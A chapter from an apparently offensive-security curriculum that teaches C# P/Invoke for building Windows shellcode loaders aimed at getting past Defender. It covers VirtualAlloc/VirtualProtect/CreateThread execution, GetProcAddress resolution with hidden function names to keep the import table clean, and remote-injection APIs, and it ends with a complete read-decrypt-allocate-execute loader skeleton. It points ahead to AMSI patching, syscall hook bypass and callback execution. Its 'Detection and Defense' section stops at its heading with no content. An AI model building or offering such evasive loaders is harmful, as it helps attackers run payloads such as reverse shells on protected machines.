# Document 03: Calling Windows Functions from C#

## Where We Are

You finished Document 02 and can write C# programs that:
- Store data in variables (int, byte, string, bool, IntPtr)
- Make decisions with if/else
- Loop through arrays with for loops
- Create and use byte arrays
- Write functions that take parameters and return results
- XOR-encrypt and decrypt data
- Read and write binary files
- Parse command-line arguments
- Use Marshal.Copy to move bytes to a raw memory address
- Build strings from integer offsets with FromOffsets

Your lab is running with Windows 11 (Defender on, default settings), Kali Linux, and both machines can reach each other on 192.168.10.0/24.

## Why This Is Next

Document 02 taught you C# programming, but all your programs so far have only printed text to the screen and worked with files. The loaders need to do much more than that. They need to allocate executable memory, write bytes into that memory, and tell the CPU to run those bytes. These are not things C# can do on its own. These are things the Windows operating system does.

Windows provides hundreds of functions that programs can call. These functions control memory, processes, threads, files, the registry, networking, security, and everything else on the system. When you call these Windows functions from C#, you are telling Windows directly what to do. This is what the loaders do: they call Windows functions to allocate memory, copy shellcode into it, and start a new thread that executes the shellcode.

The bridge between C# and Windows functions is called P/Invoke (Platform Invoke). P/Invoke lets you declare a Windows function in your C# code and then call it like any normal function. This document teaches you how P/Invoke works and walks you through the specific Windows functions that every loader uses.

## How This Works

Windows has its operating system functions organized into files called DLLs (Dynamic Link Libraries). Each DLL contains a group of related functions. The three DLLs you will use the most are:

**kernel32.dll** contains functions for memory management, process management, file operations, and other core OS tasks. Functions like VirtualAlloc (allocate memory), CreateThread (start a new thread of execution), and OpenProcess (get a handle to another running process) live in kernel32.dll.

**ntdll.dll** contains lower-level functions that kernel32.dll calls internally. When you call VirtualAlloc from kernel32.dll, it internally calls NtAllocateVirtualMemory from ntdll.dll, which then makes a system call to the Windows kernel. Document 07 teaches you to call ntdll.dll functions directly, bypassing kernel32.dll entirely.

**amsi.dll** contains functions related to the Antimalware Scan Interface. When PowerShell or other scripting engines want to scan code for malware, they call functions in amsi.dll. Document 08 teaches you to patch these functions so they stop scanning.

When you call a Windows function from C#, here is the sequence of events:

1. Your C# code calls the function using P/Invoke
2. The .NET runtime finds the function in the specified DLL
3. The .NET runtime converts your C# data types to the types the Windows function expects
4. The Windows function executes
5. The result is converted back to a C# type and returned to your code

## What Defender Does

Defender monitors which Windows functions your program calls. Certain combinations of function calls are strong indicators of malicious activity:

**VirtualAlloc + Marshal.Copy + CreateThread:** This sequence allocates memory, copies data into it, and starts executing that data. This is the classic shellcode injection pattern, and Defender watches for it.

**OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread:** This sequence opens another process, allocates memory inside it, writes data into that memory, and starts a thread in that process. This is the classic remote process injection pattern.

**GetProcAddress + GetModuleHandle:** These functions find other functions by name at runtime. Malware uses them to dynamically find Windows functions instead of importing them directly, which makes the malware harder to analyze statically.

Defender monitors these calls through hooks. When your program calls VirtualAlloc through kernel32.dll, Defender has inserted a small piece of code (a hook) at the beginning of VirtualAlloc that checks what you are doing before letting the real function run. This is one of the things Document 07 (Direct Syscalls) teaches you to bypass.

For now, the loaders in Documents 05 and 06 call these functions through the normal path (kernel32.dll), and they rely on other evasion techniques (XOR encryption, neutral naming) to avoid detection.

## The Evasion Technique

No single evasion technique in this document. This teaches the mechanism that all later evasion techniques depend on. You cannot bypass Defender's API hooks (Document 07) if you do not first understand how normal API calls work. You cannot patch AMSI (Document 08) if you do not know how to find and modify functions in memory. This document gives you the foundation.

The one evasion-relevant practice you learn here is dynamic API resolution: instead of declaring all your Windows function imports at the top of your code (which puts them in the compiled binary's import table where Defender can read them), you find functions at runtime using GetProcAddress. This technique is used in Loaders 05 through 08.

## Getting the Loader Onto the Target

No loader is built in this document. The code examples are learning exercises that run on your Windows VM. From Document 05 onward, you will transfer compiled loaders from Kali to the Windows VM.

## Teaching the Code

### Part 1: Your First Windows Function Call (DllImport)

P/Invoke lets you call a Windows function from C#. You tell C# three things: which DLL the function is in, what the function is called, and what parameters it takes. C# handles the rest.

Start with a simple example: getting the current process ID. Every running program in Windows has a unique number called a Process ID (PID). The function `GetCurrentProcessId` from kernel32.dll returns this number.

```csharp
using System;
using System.Runtime.InteropServices;
```

`System.Runtime.InteropServices` contains the DllImport attribute that P/Invoke needs. You need this using statement in every program that calls Windows functions.

```csharp
class Program
{
    [DllImport("kernel32.dll")]
    static extern uint GetCurrentProcessId();
```

This is the P/Invoke declaration. `[DllImport("kernel32.dll")]` tells C# that the next function lives in kernel32.dll. `static extern` tells C# that this function exists outside of C# (it is a Windows function, not a C# function you wrote). `uint GetCurrentProcessId()` says the function is called GetCurrentProcessId, takes no parameters, and returns a `uint` (unsigned 32-bit integer).

After this declaration, you can call `GetCurrentProcessId()` just like any C# function:

```csharp
    static void Main(string[] args)
    {
        uint pid = GetCurrentProcessId();
        Console.WriteLine("[+] Current process ID: " + pid);
    }
}
```

Here is the complete program:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    static extern uint GetCurrentProcessId();

    static void Main(string[] args)
    {
        uint pid = GetCurrentProcessId();
        Console.WriteLine("[+] Current process ID: " + pid);
    }
}
```

Run it with `dotnet run`. You will see something like:
```
[+] Current process ID: 5184
```

The number will be different every time because Windows assigns a new PID each time a program starts. Open Task Manager on the Windows VM and find your program in the list. Its PID will match.

### Part 2: VirtualAlloc - Allocating Executable Memory

This is the most important Windows function for shellcode execution. VirtualAlloc tells Windows to reserve a block of memory with specific permissions. The key permission for shellcode is "execute" because normal memory cannot be executed as code.

First, declare the function:

```csharp
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);
```

`SetLastError = true` tells C# to save the error code if VirtualAlloc fails. This lets you find out why it failed. The function takes four parameters:

`IntPtr lpAddress` is the memory address where you want the block. Pass `IntPtr.Zero` to let Windows choose the address for you (which is almost always what you want).

`uint dwSize` is how many bytes of memory you want.

`uint flAllocationType` controls what kind of allocation this is. You always use `0x3000`, which is a combination of MEM_COMMIT (0x1000) and MEM_RESERVE (0x2000). This means "reserve the address space and make the memory ready to use."

`uint flProtect` sets the memory permissions. This is where it gets important for shellcode:
- `0x04` is PAGE_READWRITE (read and write, but not execute)
- `0x20` is PAGE_EXECUTE_READ (read and execute, but not write)
- `0x40` is PAGE_EXECUTE_READWRITE (read, write, and execute)

For shellcode, you need execute permission. The simplest approach is to use `0x40` (read-write-execute), but this is a suspicious permission combination that Defender monitors. The better approach (used in the real loaders) is to allocate as `0x04` (read-write), copy the shellcode in, then change the permissions to `0x20` (execute-read) using VirtualProtect. This two-step approach is less suspicious.

Now let's call VirtualAlloc:

```csharp
        uint memSize = 4096;
        IntPtr memAddr = VirtualAlloc(
            IntPtr.Zero,
            memSize,
            0x3000,
            0x04);
```

This allocates 4096 bytes of memory with read-write permissions. Windows picks the address. The address is returned as an IntPtr.

```csharp
        if (memAddr == IntPtr.Zero)
        {
            Console.WriteLine("[-] VirtualAlloc failed.");
            return;
        }
        Console.WriteLine("[+] Allocated memory at: 0x" + memAddr.ToString("X"));
```

If VirtualAlloc returns IntPtr.Zero (address 0), it failed. You always check this. If it succeeds, you have a valid memory address where you can write data.

Here is the complete program:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool VirtualFree(
        IntPtr lpAddress,
        uint dwSize,
        uint dwFreeType);

    static void Main(string[] args)
    {
        uint size = 4096;
        Console.WriteLine("[*] Requesting " + size + " bytes of memory...");

        IntPtr mem = VirtualAlloc(IntPtr.Zero, size, 0x3000, 0x04);

        if (mem == IntPtr.Zero)
        {
            Console.WriteLine("[-] VirtualAlloc failed.");
            return;
        }

        Console.WriteLine("[+] Memory allocated at: 0x" + mem.ToString("X"));

        VirtualFree(mem, 0, 0x8000);
        Console.WriteLine("[+] Memory freed.");
    }
}
```

`VirtualFree` releases the allocated memory. `0x8000` is MEM_RELEASE, which returns the memory to Windows.

### Part 3: VirtualProtect - Changing Memory Permissions

After you copy shellcode into memory allocated with read-write permissions, you need to change those permissions to include execute. VirtualProtect changes the permissions of an existing memory block.

```csharp
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(
        IntPtr lpAddress,
        uint dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);
```

`IntPtr lpAddress` is the memory block whose permissions you are changing. `uint dwSize` is the size of the block. `uint flNewProtect` is the new permission value. `out uint lpflOldProtect` is where Windows stores the old permissions (you need to provide this variable, but you usually do not use the value).

The `out` keyword means VirtualProtect will write a value into this variable. C# requires you to declare it before the call:

```csharp
        uint oldProtect;
        bool success = VirtualProtect(mem, size, 0x20, out oldProtect);
```

This changes the memory at address `mem` from whatever permissions it had (0x04, read-write) to `0x20` (PAGE_EXECUTE_READ). After this call, the CPU is allowed to execute instructions from this memory block, but you can no longer write to it.

```csharp
        if (!success)
        {
            Console.WriteLine("[-] VirtualProtect failed.");
            return;
        }
        Console.WriteLine("[+] Memory permissions changed to execute-read.");
```

This two-step pattern (allocate as read-write, copy data, change to execute-read) is how every loader in Documents 05 and 06 handles memory. It is less suspicious than allocating directly as read-write-execute because legitimate programs also change memory permissions (for example, when loading DLLs).

Here is the complete program:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(
        IntPtr lpAddress,
        uint dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    static extern bool VirtualFree(
        IntPtr lpAddress,
        uint dwSize,
        uint dwFreeType);

    static void Main(string[] args)
    {
        uint size = 4096;

        IntPtr mem = VirtualAlloc(IntPtr.Zero, size, 0x3000, 0x04);
        if (mem == IntPtr.Zero)
        {
            Console.WriteLine("[-] VirtualAlloc failed.");
            return;
        }
        Console.WriteLine("[+] Allocated RW memory at: 0x" + mem.ToString("X"));

        byte[] data = new byte[] { 0xCC, 0x90, 0x90, 0xC3 };
        Marshal.Copy(data, 0, mem, data.Length);
        Console.WriteLine("[+] Copied " + data.Length + " bytes to memory.");

        uint oldProtect;
        bool ok = VirtualProtect(mem, size, 0x20, out oldProtect);
        if (!ok)
        {
            Console.WriteLine("[-] VirtualProtect failed.");
            return;
        }
        Console.WriteLine("[+] Changed permissions to execute-read.");
        Console.WriteLine("[*] Old permissions value: 0x" + oldProtect.ToString("X2"));

        VirtualFree(mem, 0, 0x8000);
        Console.WriteLine("[+] Memory freed.");
    }
}
```

The bytes `{ 0xCC, 0x90, 0x90, 0xC3 }` are harmless x86 instructions: 0xCC is INT3 (debugger breakpoint), 0x90 is NOP (do nothing), and 0xC3 is RET (return). We are not executing them in this example, just showing that you can copy bytes into allocated memory and change its permissions.

### Part 4: CreateThread - Executing Code in Memory

After allocating memory, copying shellcode, and changing permissions to executable, the final step is telling the CPU to actually execute the bytes. You do this by creating a new thread that starts at your shellcode's memory address.

A thread is a path of execution inside a program. Your Main function runs on the main thread. When you create a new thread, the program runs two things simultaneously: the main thread and the new thread. The new thread starts executing at whatever memory address you give it.

```csharp
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId);
```

Most of these parameters are set to zero or default values. The important one is `IntPtr lpStartAddress`, which is the memory address where the new thread starts executing. You pass the address returned by VirtualAlloc.

```csharp
        IntPtr threadHandle = CreateThread(
            IntPtr.Zero,
            0,
            mem,
            IntPtr.Zero,
            0,
            out uint threadId);
```

`IntPtr.Zero` for thread attributes means default security. `0` for stack size means default size. `mem` is the address of your shellcode in memory. `IntPtr.Zero` for parameter means no additional data passed to the thread. `0` for creation flags means the thread starts immediately.

After calling CreateThread, your shellcode is running. But the main thread (your Main function) continues executing as well. If Main reaches the end and the program exits, the new thread dies too. You need to tell the main thread to wait for the shellcode thread to finish:

```csharp
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
```

```csharp
        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
```

`0xFFFFFFFF` (also written as `uint.MaxValue`) means wait forever. The main thread pauses here and does not continue until the shellcode thread finishes. In practice, a reverse shell payload runs indefinitely until the connection drops, so the main thread stays here.

We will not run a CreateThread example with real shellcode yet because that is Document 05. But here is the complete pattern that shows VirtualAlloc, Marshal.Copy, VirtualProtect, CreateThread, and WaitForSingleObject working together:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(
        IntPtr lpAddress, uint dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll")]
    static extern bool VirtualFree(
        IntPtr lpAddress, uint dwSize, uint dwFreeType);

    static void Main(string[] args)
    {
        byte[] code = new byte[] { 0xC3 };
        uint size = (uint)code.Length;

        IntPtr mem = VirtualAlloc(IntPtr.Zero, size, 0x3000, 0x04);
        if (mem == IntPtr.Zero)
        {
            Console.WriteLine("[-] VirtualAlloc failed.");
            return;
        }
        Console.WriteLine("[+] Memory at: 0x" + mem.ToString("X"));

        Marshal.Copy(code, 0, mem, code.Length);
        Console.WriteLine("[+] Copied " + code.Length + " bytes.");

        uint oldProtect;
        if (!VirtualProtect(mem, size, 0x20, out oldProtect))
        {
            Console.WriteLine("[-] VirtualProtect failed.");
            return;
        }
        Console.WriteLine("[+] Permissions set to execute-read.");

        IntPtr thread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out uint tid);
        if (thread == IntPtr.Zero)
        {
            Console.WriteLine("[-] CreateThread failed.");
            return;
        }
        Console.WriteLine("[+] Thread " + tid + " started.");

        WaitForSingleObject(thread, 0xFFFFFFFF);
        Console.WriteLine("[+] Thread completed.");

        VirtualFree(mem, 0, 0x8000);
    }
}
```

This program allocates memory, copies a single byte `0xC3` (the RET instruction, which immediately returns), changes the permissions to executable, creates a thread at that address, and waits for it to finish. The thread starts, hits the RET instruction, and returns immediately. The program then prints "Thread completed" and exits.

In Document 05, you replace `{ 0xC3 }` with real msfvenom shellcode, and instead of returning immediately, the thread opens a reverse shell connection back to your Kali machine.

### Part 5: Dynamic API Resolution with GetProcAddress

So far, every Windows function you use has a `[DllImport]` declaration at the top of your code. When the compiler builds your program, it creates an import table that lists every DLL and function your program uses. Defender reads this import table. If it sees VirtualAlloc, CreateThread, and WriteProcessMemory all imported together, that is suspicious.

Dynamic API resolution avoids this. Instead of declaring the function with DllImport, you find it at runtime using two functions: GetModuleHandle and GetProcAddress.

```csharp
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);
```

GetModuleHandle gives you the memory address where a DLL is loaded. You pass the DLL name and get back an address.

```csharp
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
```

GetProcAddress gives you the memory address of a specific function inside a DLL. You pass the DLL address (from GetModuleHandle) and the function name, and get back the function's address.

Using them together:

```csharp
        IntPtr k32 = GetModuleHandle("kernel32.dll");
        if (k32 == IntPtr.Zero)
        {
            Console.WriteLine("[-] Could not find kernel32.dll");
            return;
        }
        Console.WriteLine("[+] kernel32.dll at: 0x" + k32.ToString("X"));
```

This finds where kernel32.dll is loaded in memory. Since kernel32.dll is loaded into every Windows process automatically, GetModuleHandle always succeeds.

```csharp
        IntPtr vaAddr = GetProcAddress(k32, "VirtualAlloc");
        if (vaAddr == IntPtr.Zero)
        {
            Console.WriteLine("[-] Could not find VirtualAlloc");
            return;
        }
        Console.WriteLine("[+] VirtualAlloc at: 0x" + vaAddr.ToString("X"));
```

This finds the address of the VirtualAlloc function inside kernel32.dll. Now you have the raw address of the function in memory.

To actually call a function by its address, you need to tell C# what parameters the function takes. You do this with a delegate, which is like a function blueprint:

```csharp
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr VirtualAllocDelegate(
        IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);
```

This defines a "shape" that matches VirtualAlloc's parameters and return type. `[UnmanagedFunctionPointer(CallingConvention.StdCall)]` tells C# that this is a Windows function using the standard calling convention.

Now convert the address to a callable function:

```csharp
        var vaFunc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(
            vaAddr, typeof(VirtualAllocDelegate));
```

`Marshal.GetDelegateForFunctionPointer` takes a memory address and a delegate type and gives you something you can call like a normal function. Now you can call VirtualAlloc through `vaFunc`:

```csharp
        IntPtr mem = vaFunc(IntPtr.Zero, 4096, 0x3000, 0x04);
```

This is identical to calling VirtualAlloc directly, but the function was found at runtime instead of being declared with DllImport. The compiled binary's import table does not contain "VirtualAlloc" because you did not use DllImport for it.

In the real loaders (05, 07, 08), the function names themselves are also hidden using FromOffsets (from Document 02). Instead of:

```csharp
        IntPtr vaAddr = GetProcAddress(k32, "VirtualAlloc");
```

The loader uses:

```csharp
        string funcName = FromOffsets(32, 54,73,82,84,85,65,76,33,76,76,79,67);
        IntPtr vaAddr = GetProcAddress(k32, funcName);
```

The string "VirtualAlloc" only exists at runtime, never in the compiled file.

Here is the complete program:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr VirtualAllocDelegate(
        IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool VirtualFree(
        IntPtr lpAddress, uint dwSize, uint dwFreeType);

    static void Main(string[] args)
    {
        IntPtr k32 = GetModuleHandle("kernel32.dll");
        Console.WriteLine("[+] kernel32.dll at: 0x" + k32.ToString("X"));

        IntPtr vaAddr = GetProcAddress(k32, "VirtualAlloc");
        Console.WriteLine("[+] VirtualAlloc at: 0x" + vaAddr.ToString("X"));

        var vaFunc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(
            vaAddr, typeof(VirtualAllocDelegate));

        IntPtr mem = vaFunc(IntPtr.Zero, 4096, 0x3000, 0x04);
        if (mem == IntPtr.Zero)
        {
            Console.WriteLine("[-] Dynamic VirtualAlloc call failed.");
            return;
        }
        Console.WriteLine("[+] Allocated memory at: 0x" + mem.ToString("X"));

        VirtualFree(mem, 0, 0x8000);
        Console.WriteLine("[+] Memory freed.");
    }
}
```

Output:
```
[+] kernel32.dll at: 0x7FFE12340000
[+] VirtualAlloc at: 0x7FFE12345678
[+] Allocated memory at: 0x1A0000
[+] Memory freed.
```

The addresses will be different on your machine. The point is that VirtualAlloc was called successfully through GetProcAddress instead of DllImport.

### Part 6: Remote Process Functions

Documents 09 and 10 inject code into other running processes. This means your loader opens another program's memory space, allocates memory inside it, writes data into it, and creates a thread in it. The functions for this are similar to the ones above but with "Ex" or "Remote" in their names.

```csharp
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(
        uint dwDesiredAccess,
        bool bInheritHandle,
        int dwProcessId);
```

OpenProcess gives you a handle to another process. A handle is like a reference number that Windows uses to track what you are allowed to do with that process. `dwDesiredAccess` specifies what permissions you want. `0x001FFFFF` is PROCESS_ALL_ACCESS, which gives you full control.

```csharp
        int targetPid = 1234;
        IntPtr processHandle = OpenProcess(0x001FFFFF, false, targetPid);
```

If this succeeds, `processHandle` is a valid handle to process 1234. If it fails (the process does not exist, or you do not have permission), it returns IntPtr.Zero.

```csharp
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);
```

VirtualAllocEx is the remote version of VirtualAlloc. Instead of allocating memory in your own process, it allocates memory inside the target process. The first parameter is the process handle from OpenProcess.

```csharp
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out int lpNumberOfBytesWritten);
```

WriteProcessMemory copies bytes from your process into the target process's memory. This is how you get your shellcode into the other process's address space.

```csharp
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId);
```

CreateRemoteThread creates a thread in the target process that starts at the address where you wrote your shellcode. After this call, the target process is executing your code.

We will not call these functions for real in this document because they require a valid target process and proper shellcode. The point is to understand the pattern:

1. OpenProcess to get a handle to the target
2. VirtualAllocEx to allocate memory in the target
3. WriteProcessMemory to copy shellcode into that memory
4. VirtualProtect (or set the right permissions in VirtualAllocEx) to make it executable
5. CreateRemoteThread to start executing the shellcode

Here is a program that demonstrates the first step (OpenProcess) safely:

```csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(
        uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);

    static void Main(string[] args)
    {
        Process[] procs = Process.GetProcessesByName("explorer");
        if (procs.Length == 0)
        {
            Console.WriteLine("[-] explorer.exe not found.");
            return;
        }

        int pid = procs[0].Id;
        Console.WriteLine("[*] Found explorer.exe with PID: " + pid);

        IntPtr handle = OpenProcess(0x0400, false, pid);
        if (handle == IntPtr.Zero)
        {
            Console.WriteLine("[-] OpenProcess failed.");
            return;
        }

        Console.WriteLine("[+] Got handle to explorer.exe: 0x" + handle.ToString("X"));

        CloseHandle(handle);
        Console.WriteLine("[+] Handle closed.");
    }
}
```

`Process.GetProcessesByName("explorer")` uses C#'s built-in Process class to find all processes named "explorer". This returns an array because there could be multiple instances. `procs[0].Id` gets the PID of the first one.

`0x0400` is PROCESS_QUERY_INFORMATION, which only lets you read information about the process, not modify it. This is safe and will not trigger Defender.

`CloseHandle` releases the handle when you are done. Always close handles to avoid resource leaks.

### Part 7: CloseHandle and Resource Cleanup

Every time a Windows function gives you a handle (OpenProcess, CreateThread, CreateFile, etc.), you own that handle and need to close it when you are done. Handles that are not closed leak resources. In a short-lived loader that exits after running shellcode, leaked handles get cleaned up by Windows when the process exits. But in the remote injection loaders (Document 09), you should clean up properly so the loader can exit cleanly:

```csharp
    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);
```

Call it whenever you are done with a handle:

```csharp
        CloseHandle(processHandle);
        CloseHandle(threadHandle);
```

### Part 8: Putting It All Together - The Loader Pattern

Every loader in this curriculum follows the same general pattern. Here is the flow, using all the functions you learned:

```csharp
using System;
using System.IO;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(
        IntPtr lpAddress, uint dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    static byte[] TransformData(byte[] data, byte[] key)
    {
        byte[] result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
            result[i] = (byte)(data[i] ^ key[i % key.Length]);
        return result;
    }

    static byte[] HexToBytes(string hex)
    {
        byte[] bytes = new byte[hex.Length / 2];
        for (int i = 0; i < bytes.Length; i++)
            bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        return bytes;
    }

    static void Main(string[] args)
    {
        if (args.Length < 2)
        {
            Console.WriteLine("Usage: program.exe <data.bin> <key_hex>");
            return;
        }

        // Step 1: Read encrypted data from file
        byte[] encData = File.ReadAllBytes(args[0]);
        Console.WriteLine("[+] Read " + encData.Length + " bytes.");

        // Step 2: Decrypt the data
        byte[] key = HexToBytes(args[1]);
        byte[] rawData = TransformData(encData, key);
        Console.WriteLine("[+] Data decrypted.");

        // Step 3: Allocate memory (read-write)
        IntPtr mem = VirtualAlloc(
            IntPtr.Zero,
            (uint)rawData.Length,
            0x3000,
            0x04);

        if (mem == IntPtr.Zero)
        {
            Console.WriteLine("[-] VirtualAlloc failed.");
            return;
        }
        Console.WriteLine("[+] Memory at: 0x" + mem.ToString("X"));

        // Step 4: Copy data into memory
        Marshal.Copy(rawData, 0, mem, rawData.Length);
        Array.Clear(rawData, 0, rawData.Length);
        Console.WriteLine("[+] Data copied, source cleared.");

        // Step 5: Change permissions to executable
        uint oldProtect;
        if (!VirtualProtect(mem, (uint)rawData.Length, 0x20, out oldProtect))
        {
            Console.WriteLine("[-] VirtualProtect failed.");
            return;
        }
        Console.WriteLine("[+] Memory is now executable.");

        // Step 6: Create thread at that address
        IntPtr thread = CreateThread(
            IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out uint tid);

        if (thread == IntPtr.Zero)
        {
            Console.WriteLine("[-] CreateThread failed.");
            return;
        }
        Console.WriteLine("[+] Thread " + tid + " started.");

        // Step 7: Wait for thread to finish
        WaitForSingleObject(thread, 0xFFFFFFFF);
    }
}
```

This is not a real loader yet because it is missing the evasion-specific techniques (it uses DllImport directly, it does not hide function names, it has teaching comments that would be suspicious in production). But the structure is exactly what every loader follows:

1. Read encrypted data from a file
2. Decrypt it using XOR with a key from the command line
3. Allocate memory with VirtualAlloc
4. Copy the decrypted data into that memory with Marshal.Copy
5. Clear the decrypted data from the C# array
6. Change memory permissions to executable with VirtualProtect
7. Create a thread at the memory address with CreateThread
8. Wait for the thread to finish

Document 05 builds the first real working loader using this exact pattern.

## Compilation and Execution

For the examples in this document:

1. Open the Lesson folder: `cd C:\Users\kimjongun\Desktop\CSharpLab\Lesson`
2. Replace Program.cs with the example code
3. Run: `dotnet run`

For the OpenProcess example, the program needs to find explorer.exe running, which it will since you are logged in to the Windows VM.

For the "putting it all together" example, you would need an encrypted data file and a key. You can test it with the file-writing code from Document 02:

```
dotnet run -- test.bin 4A7F2B1C
```

It will fail at VirtualAlloc because the data is not real shellcode, but you can see the pattern work up to that point. Real shellcode execution starts in Document 05.

## Confirming Success

After completing this document, verify you can do each of these:

- [ ] Declare a Windows function using [DllImport] with the correct DLL name and parameter types
- [ ] Call VirtualAlloc to allocate memory with specific permissions
- [ ] Use VirtualProtect to change memory permissions from read-write to execute-read
- [ ] Call CreateThread to start execution at a memory address
- [ ] Use WaitForSingleObject to keep the program running while a thread executes
- [ ] Use GetModuleHandle and GetProcAddress to find a function at runtime
- [ ] Create a delegate and use Marshal.GetDelegateForFunctionPointer to call a function by address
- [ ] Understand why dynamic API resolution avoids putting function names in the import table
- [ ] Recognize the full loader pattern: read -> decrypt -> allocate -> copy -> protect -> thread -> wait

## What Was Gained

You now understand how C# communicates with Windows. Specifically:

**DllImport** lets you call any Windows function from C#. You declare it, specify which DLL it lives in, and call it. This is how every loader interacts with the operating system.

**VirtualAlloc and VirtualProtect** control memory. Together they create a block of memory where you can write data and then execute it as code. Without these two functions, shellcode cannot run.

**CreateThread and WaitForSingleObject** start execution. CreateThread tells the CPU to begin executing instructions at a specific memory address. WaitForSingleObject keeps the program alive while the new thread runs.

**GetProcAddress and GetModuleHandle** find functions dynamically. Instead of listing all Windows functions in the import table (where Defender can read them), you find them at runtime by name. Combined with FromOffsets from Document 02, the function names never appear in the compiled binary.

**The loader pattern** is the same across all 8 loaders. The differences between loaders are what evasion techniques they add on top of this pattern: XOR encryption (Document 06), direct syscalls (Document 07), AMSI patching (Document 08), reflective injection (Document 09), or all of them combined (Document 10).

## Common Threats and Variations

### Variation 1: Using NtAllocateVirtualMemory Instead of VirtualAlloc

Instead of calling VirtualAlloc from kernel32.dll, you can call NtAllocateVirtualMemory from ntdll.dll directly. This skips kernel32.dll's wrapper and any hooks placed at the kernel32.dll level. Document 07 covers this in depth.

### Variation 2: Using Callback Functions Instead of CreateThread

Some loaders avoid calling CreateThread entirely because it is monitored. Instead, they use callback functions. Windows has functions that accept a "callback" (a function pointer that Windows calls for you). For example, EnumChildWindows accepts a callback function and calls it for each window. If you pass your shellcode's address as the callback, Windows executes your shellcode without you ever calling CreateThread. This is harder for Defender to detect because EnumChildWindows is a normal, legitimate function.

### Variation 3: Process Hollowing

Instead of injecting into a running process, you start a new process in a suspended state, replace its code with your shellcode, and then resume it. This is called process hollowing. Defender has specific detection for this technique, which is why Document 09 uses reflective injection instead (loading code into memory without replacing existing code).

## Detection and Defense (Blue Team Perspective)

The Windows API patterns in this document create specific detection opportunities:

